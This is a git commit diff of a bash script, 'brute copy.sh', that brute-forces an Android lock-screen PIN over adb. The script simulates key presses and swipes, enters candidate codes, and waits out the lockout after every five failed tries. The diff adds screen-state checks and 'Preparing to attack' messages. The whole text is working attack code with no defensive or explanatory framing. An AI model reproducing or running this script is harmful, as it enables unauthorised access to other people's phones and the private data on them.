d9aded0bfc51329f4511a6d71ba6e65223718e9d
JebemtiMaiku <niki.iff@hotmail.com>
2023-05-23 23:37:04 +0200

    asdf

--- brute copy.sh
+++ brute copy.sh
@@ -1,5 +1,12 @@
 #!/bin/bash
 
+screen="$(adb shell dumpsys activity|grep -i mCurrentFocus|awk 'NR==1{print $3}'|cut -d'}' -f1)"
+case $screen in
+    "mScreenState=OFF") echo -e "Preparing to attack."; 
+        echo -e "All Has Been Set" ;;
+    "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
+esac
+echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
 adb shell input keyevent 3
 adb shell input keyevent 82
 adb shell input swipe 407 1211 378 85
@@ -15,7 +22,6 @@ do
             adb shell input keyevent 66
             adb shell input keyevent 3
             if ! (( `expr $i + 1` % 5 )); then
-                echo "now timeout"
                 adb shell input keyevent 66
                 sleep 30
                 adb shell input keyevent 3
